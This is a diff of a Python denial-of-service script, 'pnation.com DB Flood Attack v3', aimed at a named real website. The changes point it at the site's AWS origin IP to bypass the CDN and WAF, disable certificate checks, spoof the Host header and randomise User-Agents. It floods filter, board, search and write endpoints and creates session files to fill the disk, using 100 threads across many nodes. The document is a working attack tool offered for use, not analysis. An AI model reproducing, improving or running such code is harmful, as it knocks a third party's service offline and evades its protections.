@@ -1,16 +1,11 @@
 #!/usr/bin/env python3
 """
-pnation.com DB Flood Attack v2
+pnation.com DB Flood Attack v3
 ===============================
-Target: https://pnation.com
-Vectors:
-  ① ajax.filter.php — DB filter queries
-  ② board.php       — 帖子列表查询 (JOIN-heavy)
-  ③ search.php      — 全文搜索 (最吃DB/CPU)
-  ④ write.php       — POST写操作触发DB写入
-  ⑤ Session洪水     — 无限PHPSESSID文件撑爆磁盘inode
-
-Duration: 25 min x 20 nodes x 3 workflows = massive coverage
+Target: 54.180.71.132 (AWS origin IP, DIRECT - NO CDN/WAF!)
+Strategy: 5 attack vectors hitting Apache/PHP/MySQL directly
+  - ajax.filter.php, board.php, search.php, write.php, session flood
+Duration: 25 min x 10 nodes x 3 workflows = massive
 Threads: 20 per vector x 5 vectors = 100 total
 """
 
@@ -22,9 +17,11 @@ import string
 import os
 import sys
 import json
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from concurrent.futures import ThreadPoolExecutor
 
-TARGET = "https://pnation.com"
+TARGET = "https://54.180.71.132"  # 直连 AWS 源站 IP (HTTPS, bypass CDN/WAF)
 DURATION = 25 * 60  # 25 minutes
 THREADS_PER_VECTOR = 20  # 20 threads per attack vector
 
@@ -51,7 +48,9 @@ def flood_ajax_filter():
     ] + ["".join(random.choices(string.ascii_lowercase, k=random.randint(4, 20))) for _ in range(30)]
 
     sess = requests.Session()
+    sess.verify = False
     sess.headers.update({
+        "Host": "pnation.com",
         "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
         "Accept": "*/*",
         "Connection": "keep-alive",
@@ -79,7 +78,9 @@ def flood_ajax_filter():
 def flood_board():
     bo_tables = ["free", "notice", "gallery", "qa", "etc"]
     sess = requests.Session()
+    sess.verify = False
     sess.headers.update({
+        "Host": "pnation.com",
         "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
         "Accept": "text/html,*/*",
         "Connection": "keep-alive",
@@ -115,7 +116,9 @@ def flood_search():
     ]
 
     sess = requests.Session()
+    sess.verify = False
     sess.headers.update({
+        "Host": "pnation.com",
         "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
         "Accept": "text/html,*/*",
         "Connection": "keep-alive",
@@ -145,7 +148,9 @@ def flood_write():
     """POST to write.php — triggers DB INSERT, indexes, and session writes"""
     bo_tables = ["free", "notice", "qa", "gallery", "etc"]
     sess = requests.Session()
+    sess.verify = False
     sess.headers.update({
+        "Host": "pnation.com",
         "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
         "Accept": "text/html,*/*",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -188,6 +193,7 @@ def flood_session():
     while time.time() - stats["start_time"] < DURATION:
         sess = requests.Session()
         sess.headers.update({
+            "Host": "pnation.com",
             "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
         })
         try:
